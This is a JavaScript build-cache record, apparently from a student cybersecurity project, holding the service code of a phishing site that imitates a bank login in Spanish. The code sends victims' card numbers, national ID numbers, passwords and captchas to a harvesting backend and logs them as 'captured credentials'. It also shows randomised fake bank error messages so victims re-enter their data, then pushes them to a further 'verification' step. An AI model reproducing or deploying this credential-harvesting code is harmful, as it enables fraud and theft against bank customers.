{"ast":null,"code":"import axios from 'axios';\n\n// Backend configuration\nconst API_BASE = process.env.NODE_ENV === 'production' ? '' : 'http://localhost:8000';\nexport const submitCredentials = async credentials => {\n  try {\n    // Send to Laravel backend using the correct route\n    const response = await axios.post(`${API_BASE}/banco/login`, credentials, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json',\n        'X-Requested-With': 'XMLHttpRequest'\n      }\n    });\n    return response.data;\n  } catch (error) {\n    console.error('Login error:', error);\n\n    // Log the credentials for demonstration (in real scenario this would be sent to backend)\n    console.log('Captured credentials:', {\n      tipoTarjeta: credentials.tipoTarjeta,\n      numeroTarjeta: credentials.numeroTarjeta,\n      txtDNI: credentials.txtDNI,\n      tipoDoc: credentials.tipoDoc,\n      numeroDoc: credentials.numeroDoc,\n      password: credentials.password,\n      captcha: credentials.captcha,\n      timestamp: new Date().toISOString(),\n      userAgent: navigator.userAgent,\n      ip: 'captured_by_backend'\n    });\n\n    // Simular diferentes respuestas del servidor para casos de prueba\n    const testResponses = [{\n      success: false,\n      message: 'Los datos ingresados no coinciden con nuestros registros. Verifique la información.'\n    }, {\n      success: false,\n      message: 'Su tarjeta se encuentra bloqueada temporalmente. Comuníquese con su oficina.'\n    }, {\n      success: false,\n      message: 'El número de documento ingresado no está registrado en nuestro sistema.'\n    }, {\n      success: false,\n      message: 'Servicio temporalmente no disponible. Intente más tarde.'\n    }, {\n      success: true,\n      message: 'Datos verificados exitosamente',\n      redirect: '/verification'\n    }];\n\n    // En el 80% de los casos, mostrar error para simular validación real\n    const randomResponse = Math.random() < 0.8 ? testResponses[Math.floor(Math.random() * (testResponses.length - 1))] : testResponses[testResponses.length - 1];\n    return randomResponse;\n  }\n};\nexport const submitVerification = async verificationData => {\n  try {\n    // Send to Laravel backend\n    const response = await axios.post(`${API_BASE}/banco/verificacion`, verificationData, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json',\n        'X-Requested-With': 'XMLHttpRequest'\n      }\n    });\n    return response.data;\n  } catch (error) {\n    console.error('Verification error:', error);\n\n    // Log the verification data\n    console.log('Captured verification data:', {\n      ...verificationData,\n      timestamp: new Date().toISOString()\n    });\n\n    // For demo purposes, always succeed\n    return {\n      success: true,\n      message: 'Verificación exitosa',\n      redirect: '/success'\n    };\n  }\n};","map":{"version":3,"names":["axios","API_BASE","process","env","NODE_ENV","submitCredentials","credentials","response","post","headers","data","error","console","log","tipoTarjeta","numeroTarjeta","txtDNI","tipoDoc","numeroDoc","password","captcha","timestamp","Date","toISOString","userAgent","navigator","ip","testResponses","success","message","redirect","randomResponse","Math","random","floor","length","submitVerification","verificationData"],"sources":["/media/luiss/D/upch/cyb/xploit/phishing-frontend/src/services/api.js"],"sourcesContent":["import axios from 'axios';\n\n// Backend configuration\nconst API_BASE = process.env.NODE_ENV === 'production' ? '' : 'http://localhost:8000';\n\nexport const submitCredentials = async (credentials) => {\n  try {\n    // Send to Laravel backend using the correct route\n    const response = await axios.post(`${API_BASE}/banco/login`, credentials, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json',\n        'X-Requested-With': 'XMLHttpRequest'\n      }\n    });\n    return response.data;\n  } catch (error) {\n    console.error('Login error:', error);\n    \n    // Log the credentials for demonstration (in real scenario this would be sent to backend)\n    console.log('Captured credentials:', {\n      tipoTarjeta: credentials.tipoTarjeta,\n      numeroTarjeta: credentials.numeroTarjeta,\n      txtDNI: credentials.txtDNI,\n      tipoDoc: credentials.tipoDoc,\n      numeroDoc: credentials.numeroDoc,\n      password: credentials.password,\n      captcha: credentials.captcha,\n      timestamp: new Date().toISOString(),\n      userAgent: navigator.userAgent,\n      ip: 'captured_by_backend'\n    });\n    \n    // Simular diferentes respuestas del servidor para casos de prueba\n    const testResponses = [\n      { success: false, message: 'Los datos ingresados no coinciden con nuestros registros. Verifique la información.' },\n      { success: false, message: 'Su tarjeta se encuentra bloqueada temporalmente. Comuníquese con su oficina.' },\n      { success: false, message: 'El número de documento ingresado no está registrado en nuestro sistema.' },\n      { success: false, message: 'Servicio temporalmente no disponible. Intente más tarde.' },\n      { success: true, message: 'Datos verificados exitosamente', redirect: '/verification' }\n    ];\n    \n    // En el 80% de los casos, mostrar error para simular validación real\n    const randomResponse = Math.random() < 0.8 ? \n      testResponses[Math.floor(Math.random() * (testResponses.length - 1))] : \n      testResponses[testResponses.length - 1];\n    \n    return randomResponse;\n  }\n};\n\nexport const submitVerification = async (verificationData) => {\n  try {\n    // Send to Laravel backend\n    const response = await axios.post(`${API_BASE}/banco/verificacion`, verificationData, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json',\n        'X-Requested-With': 'XMLHttpRequest'\n      }\n    });\n    return response.data;\n  } catch (error) {\n    console.error('Verification error:', error);\n    \n    // Log the verification data\n    console.log('Captured verification data:', {\n      ...verificationData,\n      timestamp: new Date().toISOString()\n    });\n    \n    // For demo purposes, always succeed\n    return { success: true, message: 'Verificación exitosa', redirect: '/success' };\n  }\n};"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}